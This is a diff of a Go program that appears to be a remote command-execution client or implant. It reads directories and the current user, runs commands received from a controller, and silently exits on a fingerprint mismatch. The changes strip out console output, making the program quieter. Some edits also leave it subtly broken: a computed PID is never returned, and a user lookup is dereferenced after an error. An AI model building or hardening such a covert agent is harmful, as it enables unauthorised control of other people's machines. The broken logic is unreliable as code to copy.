@@ -54,7 +54,6 @@ func readDir(path string) (contents string) {
 		contents += file.Name()
 		contents += ", "
 	}
-	fmt.Printf(contents)
 	return
 }
 
@@ -73,7 +72,7 @@ func runCommand(path string) (PID string) {
 func getCurrentDir() (mydir string) {
 	mydir, err := os.Getwd()
 	if err != nil {
-		fmt.Println(err)
+		mydir = "err on getting dir"
 	}
 	return
 }
@@ -81,7 +80,7 @@ func getCurrentDir() (mydir string) {
 func getCurrentUser() (name string) {
 	user, err := user.Current()
 	if err != nil {
-		fmt.Printf(err.Error())
+		name = "err on getting username"
 	}
 	name = user.Username
 	return
@@ -128,7 +127,6 @@ func main() {
 					// Compare the actual fingerprint with the expected one
 
 					if h1 != expectedFingerprint {
-						fmt.Println("Issue with fingerprint")
 						os.Exit(0)
 					}
 
@@ -199,7 +197,6 @@ func main() {
 			result = terminal(commandToRun)
 		case "pid":
 			pid := os.Getpid()
-			result = fmt.Sprint(pid)
 		case "fing":
 			expectedFingerprint = StrH(string_contents[1])
 
